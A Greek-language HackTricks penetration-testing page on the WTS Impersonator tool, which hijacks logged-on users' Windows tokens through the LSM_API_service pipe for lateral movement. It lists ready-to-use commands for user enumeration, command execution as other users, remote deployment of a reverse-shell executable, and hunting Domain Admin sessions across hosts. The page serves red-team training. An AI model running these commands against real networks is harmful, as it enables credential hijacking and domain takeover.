# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

Το εργαλείο **WTS Impersonator** εκμεταλλεύεται το **"\\pipe\LSM_API_service"** RPC Named pipe για να απαριθμεί stealthily τους συνδεδεμένους χρήστες και να κάνει hijack στα tokens τους, παρακάμπτοντας τις παραδοσιακές τεχνικές **Token Impersonation**. Αυτή η προσέγγιση διευκολύνει τις απρόσκοπτες πλευρικές μετακινήσεις μέσα στα δίκτυα. Η καινοτομία πίσω από αυτή την τεχνική αποδίδεται στον **Omri Baso**, του οποίου η εργασία είναι διαθέσιμη στο [GitHub](https://github.com/OmriBaso/WTSImpersonator).<sup>[[1]](#references)</sup>

### Βασική λειτουργικότητα

Το εργαλείο λειτουργεί μέσω μιας ακολουθίας κλήσεων API:
```bash
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Βασικά Modules και Χρήση

- **Enumerating Users**: Η απαρίθμηση local και remote χρηστών είναι δυνατή με το tool, χρησιμοποιώντας commands για κάθε σενάριο:

- Locally:
```bash
.\WTSImpersonator.exe -m enum
```
- Remotely, με καθορισμό IP address ή hostname:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Executing Commands**: Τα modules `exec` και `exec-remote` απαιτούν context **Service** για να λειτουργήσουν. Η local εκτέλεση χρειάζεται απλώς το WTSImpersonator executable και ένα command:

- Παράδειγμα local command execution:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- Το PsExec64.exe μπορεί να χρησιμοποιηθεί για την απόκτηση Service context:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Remote Command Execution**: Περιλαμβάνει τη δημιουργία και εγκατάσταση ενός service remotely, παρόμοια με το PsExec.exe, επιτρέποντας την εκτέλεση με τα κατάλληλα permissions.

- Παράδειγμα remote execution:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **User Hunting Module**: Στοχεύει συγκεκριμένους χρήστες σε πολλαπλά machines, εκτελώντας code με τα credentials τους. Αυτό είναι ιδιαίτερα χρήσιμο για τη στόχευση Domain Admins με local admin rights σε πολλά systems.
- Παράδειγμα χρήσης:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## Αναφορές

- [1] [WTSImpersonator - GitHub](https://github.com/OmriBaso/WTSImpersonator)

{{#include ../../banners/hacktricks-training.md}}
